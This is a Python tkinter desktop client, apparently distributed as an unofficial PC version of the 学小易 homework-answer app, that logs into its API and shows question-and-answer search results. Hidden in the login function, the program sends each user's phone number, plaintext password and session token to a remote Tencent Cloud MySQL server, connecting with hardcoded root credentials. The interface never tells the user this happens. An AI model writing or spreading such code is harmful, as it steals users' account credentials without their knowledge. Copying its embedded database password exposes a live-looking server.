import tkinter as tk
import requests
from bs4 import BeautifulSoup
import json
import re
import pymysql
from tkinter import END 
window = tk.Tk()
window.title('学小易电脑版')
window.geometry('1004x499')

e = tk.Entry(window)
e.place(height = 40,width = 400,x = 115,y = 33)

n = tk.Entry(window)
n.place(height = 40,width = 200,x = 715,y = 33)
p = tk.Entry(window)
p.place(height = 40,width = 200,x = 715,y = 90)


b = tk.Label(window, text='手机号：', font=('Arial', 10))
b.place(height = 40,width = 110,x = 600,y = 30)
c = tk.Label(window, text='密码：', font=('Arial', 10))
c.place(height = 40,width = 110,x = 600,y = 90)


def insert_point():
    w= e.get()
    f = open('密码.txt', 'r', encoding='utf-8')
    string = f.read()
    f.close()
        

    url='https://app.51xuexiaoyi.com/api/v1/searchQuestion'
    data={
        'keyword': w
    }
   
    headers = {
        'token':string,
        
        
        'app-version':'9.9.9',
        
        
        }
    r = requests.post(url,headers=headers,data=data)
    
    
    html1_str=json.dumps(r.json(), sort_keys=True, indent=4, separators=(',', ':'))
    n=r.json()
    n=str(n)
    r=n
    r= re.findall(r"'q'(.*?)',", r)
    n= re.findall(r"'a'(.*?)',", n)
    i=0
    
    
    while i<len(n):
        
        t.insert('insert', '问题')
        t.insert('insert',i)
        
        t.insert('insert', r[i])
        t.insert('insert', '\n')
        t.insert('insert', '答案')
        t.insert('insert',i)
        t.insert('insert', '\n')
        
        t.insert('insert', n[i])
        t.insert('insert', '\n')
        
        
        i=i+1
    
    
   

def _clear():
        e.delete(0,'end')
        
        t.delete('1.0','end')
    

def deng():
        u= n.get()
        v= p.get()
        url='https://app.51xuexiaoyi.com/api/v1/login'
        data={
            'username': u,
            'password': v
            }

        headers = {
             'Content-Type': "application/x-www-form-urlencoded; charset=UTF-8",
             'Accept-Encoding': "gzip, deflate, br"
            
            
            }
        r = requests.post(url,headers=headers,data=data)
        r=r.text
        r=str(r)
        r= re.findall(r"api_token(.*?)userid", r)
        r=str(r)
        r=r.split(':')[1]
        r=r.split(',')[0]
        print(r)
        r=r.replace('"','')
        r=str(r)
        t.insert('insert', '登录成功')
        db =pymysql.connect('gz-cynosdbmysql-grp-4e5zrl0z.sql.tencentcdb.com','root','guowei1949','sys',charset='utf8',port=20342)
        if db:
            query = """insert into mima (手机号,密码,t) values (%s,%s,%s)"""
            cur=db.cursor()
            
            values=(str(u),str(v),str(r))
            cur.execute(query, values)
            db.commit()

        with open('密码.txt', 'w') as f:
            f.write(r)
b1 = tk.Button(window, text='查询',command=insert_point)
b1.place(height = 55,width = 129,x = 115,y = 100)

b3 = tk.Button(window, text='登录',command=deng)
b3.place(height = 55,width = 329,x = 615,y = 180)


t = tk.Text(window)
t.place(height = 320,width = 465,x = 107,y = 170)

b2 = tk.Button(window, text='清空',command=_clear)
b2.place(height = 55,width = 129,x = 385,y = 100)
t3 = tk.Text(window)
t3.place(height = 320,width = 365,x = 607,y = 270)
t3.insert(END, '                    \t ---\tby IT萌主QQ：1738394450  \n\n使用说明！！！\n登录一次就ok，可以看看软件目录下是否生成：密码.txt。\n\n使用本软件封号概不负责！！！')
window.mainloop()

